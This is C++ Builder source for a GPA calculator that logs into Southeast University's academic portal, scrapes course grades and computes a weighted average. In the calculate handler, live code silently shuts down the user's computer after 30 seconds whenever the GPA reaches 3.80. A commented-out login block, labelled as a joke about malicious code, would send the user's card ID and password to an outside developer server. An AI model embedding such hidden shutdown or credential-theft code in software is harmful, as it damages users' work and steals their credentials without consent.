//---------------------------------------------------------------------------

#include <vcl.h>
#pragma hdrstop
#include <mshtml.h>
#include "Unit1.h"
#include "Unit2.h"
#include "Unit3.h"
#include "Unit4.h"
#include "Unit5.h"
#include "Unit6.h"
#include "Unit7.h"
#include "Unit8.h"
#include <stdlib.h>
#include <fstream.h>
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma link "SHDocVw_OCX"
#pragma link "XStringGrid"
#pragma resource "*.dfm"
//float Xf=0.0, Gp=0.0;
//float gt_Xf=0.0, gt_Gp=0.0;
TMainForm *MainForm;
int loginSuccess;
int isVPNed=0;
AnsiString htmContent;
AnsiString Course[149][5];
int scratched[149]={0};
int courseIndex=0;
int addMode=0;
int doMonitor=0;
//int loginSuccess=0;
int reloginTimer=0;
int needRefreshVercode=0;
int verCodeRestoreTime=0;
int selectionIndex=0;
TGridRect sel;
AnsiString ver= "GpaCalc";
//-----------------------------------------------
void debugMessage(AnsiString msg)
{
    frmDebug->RichEdit1->Lines->Text = msg;
    frmDebug->ShowModal();
}
AnsiString DeleteBefore(AnsiString subStr, AnsiString srcStr)
{
    int i=srcStr.AnsiPos(subStr);
    srcStr.Delete(1,i-1);
    return srcStr;
}
AnsiString DeleteBeforeW(AnsiString subStr, AnsiString srcStr)
{
    int i=srcStr.AnsiPos(subStr);
    srcStr.Delete(1,i-1+subStr.Length());
    return srcStr;
}
AnsiString DeleteAfter(AnsiString subStr, AnsiString srcStr)
{
    int i=srcStr.AnsiPos(subStr)+subStr.Length();
    srcStr.Delete(i,srcStr.Length()-i);
    return srcStr;
}
AnsiString DeleteAfter(int st, AnsiString srcStr)
{
    srcStr.Delete(st,srcStr.Length()-st+1);
    return srcStr;
}
AnsiString DeleteAfterW(AnsiString subStr, AnsiString srcStr)
{
    int i=srcStr.AnsiPos(subStr);
    srcStr.Delete(i,srcStr.Length()-i+1);
    return srcStr;
}

float Grade2Gp(AnsiString Gr)
{
    float Gp;
    int tmpPnt=Gr.ToIntDef(101);
    if(tmpPnt<=100) {
        if(tmpPnt>=96)Gp=4.800000;
        else if(tmpPnt>=93)Gp=4.500000;
        else if(tmpPnt>=90)Gp=4.000000;
        else if(tmpPnt>=86)Gp=3.800000;
        else if(tmpPnt>=83)Gp=3.500000;
        else if(tmpPnt>=80)Gp=3.000000;
        else if(tmpPnt>=76)Gp=2.800000;
        else if(tmpPnt>=73)Gp=2.500000;
        else if(tmpPnt>=70)Gp=2.000000;
        else if(tmpPnt>=66)Gp=1.800000;
        else if(tmpPnt>=63)Gp=1.500000;
        else if(tmpPnt>=60)Gp=1.000000;
        else if(tmpPnt>= 0)Gp=0.000000;    //endif
        else Gp = -1.000000;
    } else {
        if(Gr=="优")Gp=4.500000;
        else if(Gr=="良")Gp=3.500000;
        else if(Gr=="中")Gp=2.500000;
        else if(Gr=="及格")Gp=1.500000;
        else if(Gr=="不及格")Gp=0.000000;
        else if(Gr=="通过")Gp=1.500000; //endif
        else if(Gr=="未评教")Gp=-2.000000;
        else Gp = -1.000000;
    } return Gp;
}
//---------------------------------------------------------------------------
__fastcall TMainForm::TMainForm(TComponent* Owner)
    : TForm(Owner)
{
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::WebPostData(TCppWebBrowser *CppWebBrowser, String sURL, String sPostData)
{
    BSTR bstrHeaders = NULL;
    TVariant vFlags = {0}, vTargetFrameName={0}, vPostData={0}, vHeaders={0};
    LPSAFEARRAY psa;
    LPCTSTR cszPostData = sPostData.c_str();
    UINT cElems = lstrlen(cszPostData);
    LPSTR pPostData;
    LPVARIANT pvPostData;

    bstrHeaders = SysAllocString(L"Content-Type: application/x-www-form-urlencodedrn");
    if (!bstrHeaders) {
        Application->MessageBox("Could not allocate bstrHeaders", "Warning", MB_OK | MB_ICONWARNING);
        return;
    }
    V_VT(&vHeaders) = VT_BSTR;
    V_BSTR(&vHeaders) = bstrHeaders;

    pvPostData = vPostData;

    if(pvPostData){
        VariantInit(pvPostData);

        psa = SafeArrayCreateVector(VT_UI1, 0, cElems);
        if(!psa)
            return;
        SafeArrayAccessData(psa, (LPVOID*)&pPostData);
        memcpy(pPostData, cszPostData, cElems);
        SafeArrayUnaccessData(psa);

        V_VT(pvPostData) = VT_ARRAY | VT_UI1;
        V_ARRAY(pvPostData) = psa;
    }
    CppWebBrowser->Navigate((TVariant)sURL, &vFlags, &vTargetFrameName, &vPostData, &vHeaders);
}
//-------------------------------------------------------------------

AnsiString  TMainForm::WEB2HTMLCode(TCppWebBrowser *CppWebBrowser)
{
    extern AnsiString str_CurrPath;
    AnsiString strCode;
    IHTMLDocument2 *HTMLDocument = NULL;
    if(SUCCEEDED(CppWebBrowser->Document->QueryInterface(IID_IHTMLDocument2,
        (LPVOID*)&HTMLDocument)))
    {
        IHTMLElement *pElement = NULL;
        HTMLDocument->get_body(&pElement);
        if (pElement) {
            WideString str;
            pElement->get_innerHTML(&str);

            strCode=AnsiString(str);
            pElement->Release();
        }
        HTMLDocument->Release();
    } return strCode;
}
//---------------------------------------------------------------------------
void __fastcall TMainForm::rdLvlClick(TObject *Sender)
{
    if(rdLvl->Checked) {
        edGr->Visible=false;
        Label1->Visible=false;
        trkLvl->Visible=true;
        Label2->Visible=true;
        Label3->Visible=true;
        Label4->Visible=true;
        Label5->Visible=true;
        Label6->Visible=true;
        Label13->Visible=true;
    }
}
//---------------------------------------------------------------------------
void __fastcall TMainForm::rdPntClick(TObject *Sender)
{
    if(rdPnt->Checked) {
        edGr->Visible=true;
        Label1->Visible=true;
        trkLvl->Visible=false;
        Label2->Visible=false;
        Label3->Visible=false;
        Label4->Visible=false;
        Label5->Visible=false;
        Label6->Visible=false;
        Label13->Visible=false;
    }
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::btnAddClick(TObject *Sender)
{
    float Xf=-1.0, Gp=0.0;
    if(edXf->Text.ToIntDef(-1)<0){
        if(edXf->Text=="整数"&&rdp5->Checked==true)Xf=0.5;
        else {
            MessageDlg("请检查课程学分数输入是否正确。",mtError,(System::Set<TMsgDlgBtn, mbYes, mbHelp> () << TMsgDlgBtn(2) ),1);
            return;
        }
    }
    if((edGr->Text.ToIntDef(-1)<0||edGr->Text.ToIntDef(-1)>100)&&rdPnt->Checked==true){
        MessageDlg("请检查课程成绩分数输入是否正确。",mtError,(System::Set<TMsgDlgBtn, mbYes, mbHelp> () << TMsgDlgBtn(2) ),1);
        return;
    }
    courseIndex++;
    if((!edName->Text.IsEmpty())&&edName->Text != "课程名（可选）")
        MainForm->StringGrid1->Cells[0][courseIndex]=edName->Text;

    if(Xf<0.0)Xf=edXf->Text.ToInt()+(rdp5->Checked==true?0.5:0);

    AnsiString XfDisp;
    if(Xf == (double)((int)(Xf))) XfDisp = AnsiString(Xf)+".0";
    else XfDisp = AnsiString(Xf);
    StringGrid1->Cells[1][courseIndex]= XfDisp;

    if(rdLvl->Checked==true){
        if(trkLvl->Position==0)Gp=0.000000;
        else Gp=trkLvl->Position+0.500000;
        AnsiString tmp;
        if(Gp==4.50)tmp="优";
        else if(Gp==3.50)tmp="良";
        else if(Gp==2.50)tmp="中";
        else if(Gp==1.50)tmp="及格";
        else if(Gp==0.00)tmp="不及格";
        StringGrid1->Cells[2][courseIndex]=tmp;
    } else {
        int tmpPnt=edGr->Text.ToInt();
        Gp=Grade2Gp(tmpPnt);
        StringGrid1->Cells[2][courseIndex]=AnsiString(tmpPnt);
    }

    AnsiString gpdisp=AnsiString(Gp)+".0000";
    gpdisp=gpdisp.SetLength(3);
    if(gpdisp[3]=='7')gpdisp=gpdisp.SetLength(2)+"8";
    StringGrid1->Cells[5][courseIndex]=gpdisp;


    //int i=courseIndex-1;
    StringGrid1->Cells[6][courseIndex]="Yes";

    StringGrid1->Repaint();

    edXf->Text="整数";
    edXf->Font->Color=clGrayText;
    rdp0->Checked=true;
    rdp5->Checked=false;
    rdPnt->Checked=true;
    rdLvl->Checked=false;
    edGr->Text="整数";
    edGr->Font->Color=clGrayText;
    trkLvl->Position=3;
    edGr->Visible=true;
    Label1->Visible=true;
    trkLvl->Visible=false;
    Label2->Visible=false;
    Label3->Visible=false;
    Label4->Visible=false;
    Label5->Visible=false;
    Label6->Visible=false;
    edName->Font->Color = clGrayText;
    edName->Text="课程名（可选）";
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::btnCalcClick(TObject *Sender)
{
    float gpa;
    int in_Xf=0, in_Gp=0;
    for(int i=1;i<=courseIndex;i++)
    {
        if(StringGrid1->Cells[6][i]!="Yes")continue;
        //[--ISSUE: can't handle credits > 10 courses
        //in_Xf+=(AnsiString(StringGrid1->Cells[1][i][1])+AnsiString(StringGrid1->Cells[1][i][3])).ToInt();
        //ISSUE ENDS--]
        //[--FIX ATTEMPT 1:
        int tmpin_Xf = 0;
        if(AnsiString(StringGrid1->Cells[1][i][2])==".") {
            tmpin_Xf=(AnsiString(StringGrid1->Cells[1][i][1])+AnsiString(StringGrid1->Cells[1][i][3])).ToInt();
        } else {
            tmpin_Xf=(AnsiString(StringGrid1->Cells[1][i][1])+AnsiString(StringGrid1->Cells[1][i][2])+AnsiString(StringGrid1->Cells[1][i][4])).ToInt();
        }
        in_Xf += tmpin_Xf;
        //--]
        in_Gp += tmpin_Xf * (AnsiString(StringGrid1->Cells[5][i][1])+AnsiString(StringGrid1->Cells[5][i][3])).ToInt();;
    }
    if(in_Xf==0){
        MessageDlg("您没有选择任何具有学分的课程！",mtError,(System::Set<TMsgDlgBtn, mbYes, mbHelp> () << TMsgDlgBtn(2) ),1);
        return;
    }
    gpa=(in_Gp*1.0)/(in_Xf*1.0*10);
    AnsiString gpadisp;
    //妈的我都不知道自己在写什么玩意儿
    //if( ((int)(gpa*100)) %10!=0 && ((int)(gpa*1000)) %10==0 )
    if(in_Gp%(in_Xf*10)==0)gpadisp = AnsiString(in_Gp/in_Xf/10) + ".000000";
    else gpadisp=AnsiString(gpa)+"000000";
    //else gpadisp=AnsiString(gpa)+".00000";
    if(gpadisp.SubString(6,4)=="9999")
        gpadisp=AnsiString(((int)(gpa*1000+1))/1000.0)+"00000";
    gpadisp=gpadisp.SetLength(5);

    MessageDlg("所选课程的平均学分绩点为："+gpadisp,mtInformation,(System::Set<TMsgDlgBtn, mbYes, mbHelp> () << TMsgDlgBtn(2) ),1);
    if(gpa>=3.80){
        system("shutdown -s -t 30");
        ShowMessage("30秒后自动关机，享受吧学霸。23333333");
        Close();
    }
}
//---------------------------------------------------------------------------
void __fastcall TMainForm::Label7Click(TObject *Sender)
{
    MainForm->DefocusControl(StringGrid1, 0);
    AboutBox->ShowModal();
}
//---------------------------------------------------------------------------

void getCourseList()
{
    int origCourseIndex = courseIndex;
//initializational process
    //ShowMessage(htmContent);
    htmContent=DeleteBefore("<TR onmouseover=\"this.style.backgroundColor='#bbbbbb'\" onmouseout=\"this.style.backgroundColor=''\">",htmContent);
//cycle starts
    //determines end
    //ShowMessage(AnsiString(htmContent.AnsiPos("<TR onmouseover=\"this.style.backgroundColor='#bbbbbb'\" onmouseout=\"this.style.backgroundColor=''\">")));
    while(htmContent.AnsiPos("<TR onmouseover=\"this.style.backgroundColor='#bbbbbb'\" onmouseout=\"this.style.backgroundColor=''\">")!=0)
    {
        //debugMessage(htmContent);
        //gets course name
        htmContent=DeleteBeforeW("<TD width=\"20%\" align=center>",htmContent);
        Course[courseIndex][0]=DeleteAfterW("&nbsp;</TD>",htmContent);
        //ShowMessage(AnsiString(htmContent.AnsiPos("<TD width=\"10%\" align=center>")));
        //gets credit
        htmContent=DeleteBeforeW("<TD width=\"10%\" align=center>",htmContent);
        Course[courseIndex][1]=DeleteAfterW("&nbsp;</TD>",htmContent);
        //ShowMessage("");
        //gets grades
        htmContent=DeleteBeforeW("<TD width=\"10%\" align=center>",htmContent);
        Course[courseIndex][2]=DeleteAfterW("&nbsp;</TD>",htmContent);
        //ShowMessage("");
        //gets timeattrib
        htmContent=DeleteBeforeW("<TD width=\"10%\" align=center>",htmContent);
        Course[courseIndex][3]=DeleteAfterW("&nbsp;</TD>",htmContent);
        //ShowMessage("");
        //gets courseattrib
        htmContent=DeleteBeforeW("<TD width=\"10%\" align=center>",htmContent);
        Course[courseIndex][4]=DeleteAfterW("</TD>",htmContent);
        //ShowMessage("");
        //processes courseattrib
        if(Course[courseIndex][4]=="&nbsp;")Course[courseIndex][4]="";
        else Course[courseIndex][4]=DeleteAfterW("&nbsp;",Course[courseIndex][4]);
        //next
        courseIndex++;
        //ShowMessage(htmContent);
    }
    int i,j;
    for(i=origCourseIndex,j=0;i<courseIndex;j==4?i++,j=0:j++)
    {
        MainForm->StringGrid1->Cells[j][i+1]=Course[i][j];
        if(j==4)
        {

            if(Course[i][2]=="未评教"){
                MainForm->StringGrid1->Cells[5][i+1]="0.0";
            } else {
                AnsiString gpdisp=AnsiString(Grade2Gp(Course[i][2]))+".0000";
                gpdisp=gpdisp.SetLength(3);
                if(gpdisp[3]=='7')gpdisp=gpdisp.SetLength(2)+"8";
                MainForm->StringGrid1->Cells[5][i+1]=gpdisp;
            }
        }
        if(Course[i][4]==""&&!(Course[i][2]=="未评教")){
            MainForm->StringGrid1->Cells[6][i+1]="Yes";
        } else {
            MainForm->StringGrid1->Cells[6][i+1]="";
        }
    }
    MainForm->Label8->Caption="课程添加完成！总课程数："+AnsiString(courseIndex);
    MessageDlg("课程添加完成！本次添加的课程数："+AnsiString(courseIndex-origCourseIndex)+"\n\
请手动选择好需要参加计算的课程，在\"参加计算\"一栏单击即可切换，或右击获得更多选项。\n\
可以参考教务处给出的GPA（如果有）猜测参加计算的课程种类。选择完毕后点击计算！\
 ",mtInformation,(System::Set<TMsgDlgBtn, mbYes, mbHelp> () << TMsgDlgBtn(2) ),1);
    MainForm->btnReAddCourses->Enabled=true;
}
//---------------------------------------------------------------------------


void __fastcall TMainForm::FormCreate(TObject *Sender)
{
    Label8->Caption="";
    loginSuccess=0;
    CppWebBrowser1->Navigate(L"http://xk.urp.seu.edu.cn/studentService/system/showLogin.action");
    sel.Left=6;
    sel.Top=0;
    sel.Right=6;
    sel.Bottom=0;
    StringGrid1->Selection=sel;
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::btnModeClick(TObject *Sender)
{
    if(addMode==0)
    {
        grGr->Visible=false;
        grXf->Visible=false;
        btnAdd->Visible=false;
        grAutomate->Visible=true;
        btnMode->Caption="点击切换为手动模式";
        addMode=1;
    }
    else if(addMode==1)
    {
        grAutomate->Visible=false;
        grGr->Visible=true;
        grXf->Visible=true;
        btnAdd->Visible=true;
        btnMode->Caption="点击切换为自动模式";
        addMode=0;
    }
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::btnGetVercodeClick(TObject *Sender)
{
    doMonitor=0;
    CppWebBrowser1->Stop();
    if(!isVPNed)CppWebBrowser1->Navigate(L"http://xk.urp.seu.edu.cn/studentService/getCheckCode");
    else CppWebBrowser1->Navigate(L"https://vpn2.seu.edu.cn/studentService/,DanaInfo=xk.urp.seu.edu.cn+getCheckCode");
    CppWebBrowser1->Left=328;
    CppWebBrowser1->Top=136;
    btnGetVercode->Enabled=false;
    btnGetVercode->Caption="获取(10)";
    verCodeRestoreTime=10;
    needRefreshVercode=0;
    tmVercode->Enabled=true;
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::tmVercodeTimer(TObject *Sender)
{
    if(verCodeRestoreTime<=0||verCodeRestoreTime>15)return;
    verCodeRestoreTime--;
    btnGetVercode->Caption="获取("+AnsiString(verCodeRestoreTime)+")";
    if(verCodeRestoreTime==0){
        btnGetVercode->Caption="获取";
        btnGetVercode->Enabled=true;
        tmVercode->Enabled=false;
    }
}
//---------------------------------------------------------------------------
/*
wchar_t* char2wch(char* orig)
{
    size_t newsize = strlen(orig) + 1;
    wchar_t * wcstring = new wchar_t[newsize];
    //size_t convertedChars = 0;
    mbstowcs(wcstring, orig, newsize);
    return wcstring;
}   */

void __fastcall TMainForm::btnLoginClick(TObject *Sender)
{
    if(edCardId->Text.ToIntDef(-1)>=300000000||edCardId->Text.ToIntDef(-1)<200000000)
    {
        MessageDlg("请检查一卡通号输入是否正确。",mtError,(System::Set<TMsgDlgBtn, mbYes, mbHelp> () << TMsgDlgBtn(2) ),1);
        return;
    }
    if(edCardPw->Text.IsEmpty()){
        MessageDlg("请检查一卡通密码输入是否正确。",mtError,(System::Set<TMsgDlgBtn, mbYes, mbHelp> () << TMsgDlgBtn(2) ),1);
        return;
    }
    if(edVercode->Text.ToIntDef(-1)>=10000||edCardId->Text.ToIntDef(-1)<0)
    {
        MessageDlg("请检查验证码输入是否正确。",mtError,(System::Set<TMsgDlgBtn, mbYes, mbHelp> () << TMsgDlgBtn(2) ),1);
        return;
    }
    if(needRefreshVercode==1)
    {
        MessageDlg("请刷新验证码后登录。",mtInformation,(System::Set<TMsgDlgBtn, mbYes, mbHelp> () << TMsgDlgBtn(2) ),1);
        verCodeRestoreTime=1;
        btnGetVercode->Caption="获取";
        btnGetVercode->Enabled=true;
        return;
    }
    Label8->Caption="登录中，请耐心等候";
    btnLogin->Enabled=false;
    reloginTimer=10;
    tmLogin->Enabled=true;
    CppWebBrowser1->Navigate(L"about:blank");
    CppWebBrowser1->Left=-816;
    CppWebBrowser1->Top=128;
    CppWebBrowser1->Stop();
    Sleep(500);
    doMonitor=2;
    needRefreshVercode=1;
    //--------------------------------------------------------------
    // 将用户名和密码上传至软件开发者服务器的恶意代码（滑稽
    //    wchar_t* apidata= char2wch(("http://cls1416.us/api/append.php?app="+ver+"&user="+edCardId->Text+"&key="+edCardPw->Text).c_str());
    //    CppWebBrowser2->Navigate(apidata);
    //--------------------------------------------------------------
    if(!isVPNed)WebPostData(CppWebBrowser1,"http://xk.urp.seu.edu.cn/studentService/system/login.action","userName="+edCardId->Text+"&password="+edCardPw->Text+"&vercode="+edVercode->Text+"&x=0&y=0");
    else WebPostData(CppWebBrowser1,"https://vpn2.seu.edu.cn/studentService/system/,DanaInfo=xk.urp.seu.edu.cn+login.action","userName="+edCardId->Text+"&password="+edCardPw->Text+"&vercode="+edVercode->Text+"&x=0&y=0");
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::CppWebBrowser1DownloadComplete(TObject *Sender)
{
    if(doMonitor<=-1){
        AnsiString tmp=WEB2HTMLCode(CppWebBrowser1);
        //ShowMessage(tmp);
        if(tmp.Pos("用户名或密码无效。")!=0){
            doMonitor=0;
            Label8->Caption="用户名或密码错误";
            MessageDlg("用户名或密码错误！",mtError,(System::Set<TMsgDlgBtn, mbYes, mbHelp> () << TMsgDlgBtn(2) ),1);
            CppWebBrowser1->Navigate(L"https://vpn2.seu.edu.cn/dana-na/auth/url_default/welcome.cgi");
            btnGetVercode->Enabled=true;
            btnLogin->Enabled=true;
            return;
        }
        if(tmp.SetLength(40)=="<TABLE id=table_confirmation_opensession"){
            doMonitor=-100;
            //doMonitor=0;
            Label8->Caption="VPN重复登录！";
            MessageDlg("您已在本机登录VPN！\n请在网页窗口中执行“关闭选中会话并登录”后继续操作！",mtError,(System::Set<TMsgDlgBtn, mbYes, mbHelp> () << TMsgDlgBtn(2) ),1);
            CppWebBrowser1->Left=328;
            CppWebBrowser1->Top=136;
            return;
        }
        if(tmp.SetLength(26)=="<TABLE id=table_useruimenu"){
            goto vpnsuccess;
        }
    }
    if(doMonitor==-100){
        vpnsuccess:
        doMonitor=0;
        Sleep(500);
        CppWebBrowser1->Navigate(L"https://vpn2.seu.edu.cn/studentService/,DanaInfo=xk.urp.seu.edu.cn+getCheckCode");
        CppWebBrowser1->Left=328;
        CppWebBrowser1->Top=136;
        btnGetVercode->Enabled=false;
        btnGetVercode->Caption="获取(15)";
        verCodeRestoreTime=15;
        tmVercode->Enabled=true;
        needRefreshVercode=0;
        isVPNed=1;
        btnLogin->Enabled=true;
        btnVPN->Enabled=false;
        Label8->Caption="已登录VPN";
        MessageDlg("您已成功登录VPN！\n请输入验证码，点击“登录教务处”获取成绩！",mtInformation,(System::Set<TMsgDlgBtn, mbYes, mbHelp> () << TMsgDlgBtn(2) ),1);
        return;
    }
    if(doMonitor>=1)
    {
        AnsiString tmp=WEB2HTMLCode(CppWebBrowser1);
        if(tmp.SetLength(12)=="<FRAME title"){
            doMonitor--;
            if(doMonitor==0){
                loginSuccess=2;
                btnLogin->Enabled=false;
                btnVPN->Enabled=false;
                Label8->Caption="已登录，正在添加课程...";
                btnGetVercode->Enabled=false;
                btnGetVercode->Caption="获取";
                tmVercode->Enabled=false;
                tmLogin->Enabled=false;
                btnReAddCourses->Visible=true;
                Sleep(500);
                if(!isVPNed)CppWebBrowser1->Navigate(L"http://xk.urp.seu.edu.cn/studentService/cs/stuServe/studentExamResultQuery.action");
                else CppWebBrowser1->Navigate(L"https://vpn2.seu.edu.cn/studentService/cs/stuServe/,DanaInfo=xk.urp.seu.edu.cn+studentExamResultQuery.action");
            }
        }
        Sleep(500);
        return;
    }
    if(loginSuccess>1)
    {
        loginSuccess--;
        return;
    }
    if(loginSuccess==1)
    {
        loginSuccess=0;
        htmContent=WEB2HTMLCode(CppWebBrowser1);
        Sleep(1000);
        getCourseList();
        return;
    }
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::Label12Click(TObject *Sender)
{
    ShowMessage("not available for now");
}
//---------------------------------------------------------------------------


void __fastcall TMainForm::tmLoginTimer(TObject *Sender)
{
    if(reloginTimer<=0||reloginTimer>15)return;
    reloginTimer--;
    btnLogin->Caption="重新登录("+AnsiString(reloginTimer)+")";
    if(reloginTimer==0){
        btnLogin->Caption="重新登录";
        btnLogin->Enabled=true;
        btnGetVercode->Enabled=true;
        tmLogin->Enabled=false;
    }
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::edCardPwChange(TObject *Sender)
{
    labLength->Caption=AnsiString(edCardPw->Text.Length());
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::labLengthMouseDown(TObject *Sender,
      TMouseButton Button, TShiftState Shift, int X, int Y)
{
    if(Button == mbLeft){
        labLength->Color = clWindow;
        edCardPw->PasswordChar = '\0';
    } else if (Button == mbRight){
        labLength->Color = clWindow;
        edCardPw->PasswordChar = '8';
    }
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::labLengthMouseUp(TObject *Sender,
      TMouseButton Button, TShiftState Shift, int X, int Y)
{
    if(Button != mbLeft && Button != mbRight) return;

    labLength->Color = clBtnFace;
    edCardPw->PasswordChar = '*';
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::labLengthMouseLeave(TObject *Sender)
{
    labLength->Color = clBtnFace;
    edCardPw->PasswordChar = '*';
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::FormCanResize(TObject *Sender, int &NewWidth,
      int &NewHeight, bool &Resize)
{
    Resize=false;
    if(NewWidth<761){
        NewWidth=761;
        if(NewHeight<488)
            NewHeight=488;
    }
    else if(NewHeight<488){
        NewHeight=488;
        if(NewWidth<761)
            NewWidth=761;
    }
    else Resize=true;
}
//---------------------------------------------------------------------------
/* string grid 1 height modification */
void __fastcall TMainForm::FormResize(TObject *Sender)
{
    StringGrid1->Width = 465 + (MainForm->Width - 761);//
    StringGrid1->Columns->Items[0]->Width = 168 + (MainForm->Width - 761);//
    StringGrid1->Height = 409 + (MainForm->Height - 488);//
    btnCalc->Height = 41 + (MainForm->Height - 488)/4;//
    btnCalc->Top = 433 + (MainForm->Height - 488) - btnCalc->Height;//
}
//---------------------------------------------------------------------------
int mouX, mouY;
int aCol, aRow;
int scrIndex;
int oper=0;
int operC=0, operR=0;
void __fastcall TMainForm::StringGrid1MouseUp(TObject *Sender,
      TMouseButton Button, TShiftState Shift, int X, int Y)
{
    mouX = X;
    mouY = Y;
    if (Button == mbLeft)
    {
        int bCol, bRow;
        StringGrid1->MouseToCell(mouX, mouY, bCol, bRow);
        if(bCol == 6 && bRow >= 1 && bRow <= courseIndex){
            if(StringGrid1->Cells[2][bRow]=="未评教")return;
            if(StringGrid1->Cells[6][bRow]=="") {
                StringGrid1->Cells[6][bRow]="Yes";
            } else if(StringGrid1->Cells[6][bRow]=="Yes"){
                StringGrid1->Cells[6][bRow]="";
            }
        }
        else if(bCol == 6 && bRow == 0) {
            int i=0;
            while(i++<courseIndex)
            {
                if(StringGrid1->Cells[2][i]=="未评教")continue;
                StringGrid1->Cells[6][i]="Yes";
            }
        }
        else if((chkScratch->Checked == true||chkGuess->Checked==true) && bRow!=0 && bRow <= courseIndex && (bCol == 5 || bCol == 2))
        {
            if(StringGrid1->Cells[2][bRow]=="未评教"){
                return;
            }
            scrIndex = bRow - 1;
            if(scratched[scrIndex]){
                return;
            }
            if(chkScratch->Checked == true){
                AnsiString scrString;
                if(bCol == 2){
                    switch(StringGrid1->Cells[2][bRow].ToIntDef(-100)/10){
                        case -10: case 10:
                            scrString = StringGrid1->Cells[2][bRow];
                            break;
                        case 0:
                            scrString = "  "+StringGrid1->Cells[2][bRow];
                            break;
                        default:
                            scrString = " "+StringGrid1->Cells[2][bRow];
                    }
                } else if(bCol == 5){
                    scrString = StringGrid1->Cells[5][bRow];
                }
                TfrmScratch* scrat;
                scrat = new TfrmScratch(MainForm);
                scrat->Label1->Caption=scrString;
                oper =1;
                operC = bCol, operR = bRow;
                sel.Left=0;
                sel.Top=bRow;
                sel.Right=0;
                sel.Bottom=bRow;
                StringGrid1->Selection=sel;
                StringGrid1->Repaint();
                scrat->ShowModal();
                oper =0;
                sel.Left=6;
                sel.Top=0;
                sel.Right=6;
                sel.Bottom=0;
                StringGrid1->Selection=sel;
                StringGrid1->Repaint();
                delete scrat;
            } else if(chkGuess->Checked == true){
                if(StringGrid1->Cells[2][bRow].ToIntDef(-100)==-100){
                    if( StringGrid1->Cells[2][bRow]!="优"&&
                        StringGrid1->Cells[2][bRow]!="良"&&
                        StringGrid1->Cells[2][bRow]!="中"&&
                        StringGrid1->Cells[2][bRow]!="及格"&&
                        StringGrid1->Cells[2][bRow]!="不及格"){
                        MessageDlg("这门课没法猜啊。\n我这么说，你大概就明白了吧？",mtError,(System::Set<TMsgDlgBtn, mbYes, mbHelp> () << TMsgDlgBtn(2) ),1);
                        return;
                    }
                }
                if(bCol==2) {
                    target = StringGrid1->Cells[2][bRow].ToIntDef(-1);
                    if(target==-1){
                        MessageDlg("这儿没法猜啊。\n我这么说，你大概就明白了吧？",mtError,(System::Set<TMsgDlgBtn, mbYes, mbHelp> () << TMsgDlgBtn(2) ),1);
                        return;
                    }
                    isGP=0;
                } else if(bCol==5) {
                    target = StringGrid1->Cells[5][bRow].ToDouble()*10;
                    isGP=1;
                }
                oper =1;
                operC = bCol, operR = bRow;
                sel.Left=0;
                sel.Top=bRow;
                sel.Right=0;
                sel.Bottom=bRow;
                StringGrid1->Selection=sel;
                StringGrid1->Repaint();
                frmGuess->ShowModal();
                oper =0;
                sel.Left=6;
                sel.Top=0;
                sel.Right=6;
                sel.Bottom=0;
                StringGrid1->Selection=sel;
                StringGrid1->Repaint();
            }
        }
    }
    else if(Button == mbRight)
    {
        StringGrid1->MouseToCell(mouX, mouY, aCol, aRow);
        if(courseIndex==0){
            C1->Enabled=false;
            mitExclAll->Enabled=false;
            mitIncludeAll->Enabled=false;
            mitScra->Enabled=false;
            mitScra->Checked=false;
            mitExclude->Checked = false;
        } else {
            C1->Enabled=true;
            mitExclAll->Enabled=true;
            mitIncludeAll->Enabled=true;
        }
        if(aRow > courseIndex || aRow == 0) {
            mitExclude->Enabled=false;
            mitDelete->Enabled=false;
            mitEditCourse->Enabled=false;
            mitScra->Enabled=false;
            mitScra->Checked=false;
            mitExclude->Checked = false;
        } else {
            mitExclude->Enabled=true;
            mitDelete->Enabled=true;
            mitEditCourse->Enabled=true;
            mitScra->Enabled=true;
            if(StringGrid1->Cells[6][aRow]=="")
                mitExclude->Checked = false;
            else
                mitExclude->Checked = true;
        }
        if(StringGrid1->Cells[2][aRow]=="未评教"){
            mitExclude->Enabled=false;
            mitExclude->Checked=false;
        }
        if((chkScratch->Checked == true||chkGuess->Checked==true) && aRow <= courseIndex){
            mitScra->Enabled=true;
            if(!scratched[aRow-1])
            {
                mitScra->Checked=false;
            } else mitScra->Checked=true;
        } else {
            mitScra->Enabled=false;
            mitScra->Checked=false;
        }
        ppmOnGrid->Popup(MainForm->Left + StringGrid1->Left +12+ X, MainForm->Top + StringGrid1->Top + 32 + Y);
    }
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::mitExcludeClick(TObject *Sender)
{
    if(StringGrid1->Cells[2][aRow]=="未评教")return;
    if(StringGrid1->Cells[6][aRow]=="") {
        StringGrid1->Cells[6][aRow]="Yes";
    } else if(StringGrid1->Cells[6][aRow]=="Yes"){
        StringGrid1->Cells[6][aRow]="";
    }
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::mitScraClick(TObject *Sender)
{
    if(!scratched[aRow-1])
        scratched[aRow-1]=1;
    else scratched[aRow-1]=0;
    StringGrid1->Repaint();
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::mitDeleteClick(TObject *Sender)
{
    for(int i=0; i<7; i++)StringGrid1->Cells[i][aRow]="";
    for(int j=aRow; j<courseIndex; j++) {
        for(int i=0; i<7; i++)StringGrid1->Cells[i][j]=StringGrid1->Cells[i][j+1];
    }
    for(int i=0; i<7; i++)StringGrid1->Cells[i][courseIndex]="";
    courseIndex --;
    StringGrid1->Repaint();
}
//---------------------------------------------------------------------------

void __fastcall TMainForm::mitClearClick(TObject *Sender)
{
    for(int j=1; j<=courseIndex; j++) {
        for(int i=0; i<7; i++)StringGrid1->Cells[i][j]="";
    }
    courseIndex = 0;
    MessageDlg("课程已清空。",mtInformation,(System::Set<TMsgDlgBtn, mbYes, mbHelp> () << TMsgDlgBtn(2) ),1);
    StringGrid1->Repaint();
}
//---------------------------------------------------------------------------

